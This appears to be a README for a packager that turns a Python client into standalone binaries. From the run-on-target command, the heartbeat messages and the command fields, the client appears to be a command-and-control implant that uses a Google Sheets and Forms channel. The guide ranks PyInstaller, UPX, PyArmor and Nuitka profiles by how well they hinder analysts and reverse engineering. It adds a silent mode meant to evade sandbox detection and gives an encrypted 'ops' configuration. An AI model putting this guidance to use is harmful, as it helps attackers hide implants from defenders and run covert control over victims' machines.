# Client Packager

`packager.py` builds a standalone client binary from `client.py`. No Python installation required on the target machine. Config is read from environment variables at runtime — nothing is baked into the binary.

```bash
python packager.py
```

The packager is interactive — it walks through profile selection, silent mode, module selection, and output name.

---

## Obfuscation Profiles

Four profiles are available, ordered by obfuscation strength. Select the one that fits your needs.

| Profile | Method | What an analyst sees |
|---------|--------|----------------------|
| `basic` | PyInstaller `--onefile` | Raw Python bytecode — extractable with pyinstxtractor + decompiler |
| `upx` | PyInstaller + UPX compression | Must `upx -d` the binary before the Python layer is accessible |
| `pyarmor` | PyArmor encryption + PyInstaller | Encrypted bytecode — `pyarmor_runtime.so` required to decrypt |
| `nuitka` | Nuitka → native C binary | No Python bytecode anywhere — requires a disassembler (Ghidra, IDA) |

### basic

Bundles Python + all dependencies into a single executable using PyInstaller `--onefile`. Fast build (~30s). The Python layer is accessible to anyone with pyinstxtractor.

### upx

Same as basic, then runs UPX directly on the output binary. Changes the binary's header and signature. Adds a decompression stub — analyst must unpack before reaching the Python layer.

> Note: PyInstaller's built-in UPX integration is disabled on Linux. The packager runs UPX as a post-build step instead.

### pyarmor

PyArmor encrypts `client.py` bytecode before PyInstaller bundles it. pyinstxtractor yields encrypted blobs instead of readable bytecode. The decryption key is baked into a native `pyarmor_runtime.so` file — without the exact `.so` from your build, the blobs are noise.

**Important:** PyArmor's encryption hides import statements from PyInstaller's static tracer. The packager declares all required stdlib imports explicitly via `--hidden-import`. If you add new stdlib imports to `client.py`, add them to `PYARMOR_STDLIB_IMPORTS` in `packager.py`.

### nuitka

Nuitka compiles Python → C → native ELF (Linux) or .exe (Windows). No Python bytecode exists in the output — not encrypted, not hidden, simply absent. Reversing requires a disassembler and C-level analysis. Build time: several minutes.

**Do not run `strip` or UPX on Nuitka `--onefile` binaries.** Nuitka embeds its compressed payload in a custom ELF section. `strip` removes it; UPX corrupts the bootstrap. Both cause a segfault at runtime.

---

## Silent Mode

Available for all profiles. Suppresses all console output from the binary by prepending:

```python
print = lambda *_a, **_kw: None
```

to `client.py` before building. Every `print()` call becomes a no-op. In Nuitka's case the C compiler eliminates the dead code entirely.

**Why it matters:** Dynamic sandbox analysis watches stdout. A binary that prints `[client] Heartbeat sent` every few seconds identifies itself immediately. Silent mode removes all observable console behavior.

---

## Module Selection

The packager asks which crypto and fragmenter modules to bundle. Only selected modules are included — unused ones add no weight to the binary.

| Module | Type | Description |
|--------|------|-------------|
| `plaintext` | crypto | No encryption — cleartext values in sheet. For debug/demo. |
| `fernet` | crypto | AES-128-CBC + HMAC-SHA256. Recommended for ops. |
| `passthrough` | fragmenter | No fragmentation. Default. |
| `fixed` | fragmenter | Fixed-size chunks. Required for large payloads. |

Select "All of the above" to bundle everything — allows the active module to be switched via the `config` command at runtime.

---

## Prerequisites

```bash
# Python deps — install into your venv
pip install PyInstaller pyarmor nuitka

# System deps (Linux)
sudo apt install upx       # required for upx profile
sudo apt install patchelf  # required for nuitka profile
```

On Windows, Nuitka requires MSVC or MinGW instead of gcc. On macOS, Xcode command-line tools provide the compiler.

---

## Output

The binary is written to `dist/<name>` (Linux/macOS) or `dist/<name>.exe` (Windows).

Run on target:

```bash
SPREADSHEET_ID=xxx \
FORMS_URL=xxx \
INBOX_FORMS_URL=xxx \
FORMS_FIELD_MAP='{"command_id":"entry.X",...}' \
ENCRYPTION_METHOD=fernet \
ENCRYPTION_KEY=xxx \
PYTHONUNBUFFERED=1 \
./client
```

`PYTHONUNBUFFERED=1` ensures output appears immediately (has no effect in silent builds).

---

## Cross-Platform Notes

PyInstaller and Nuitka cannot cross-compile. A binary built on Linux only runs on Linux.

| Target OS | Build machine required |
|-----------|----------------------|
| Linux (x86_64) | Any Linux box |
| Windows | Windows machine |
| macOS | macOS machine |

The `client.py` source is fully cross-platform. Run `packager.py` natively on each target OS to produce the corresponding binary.
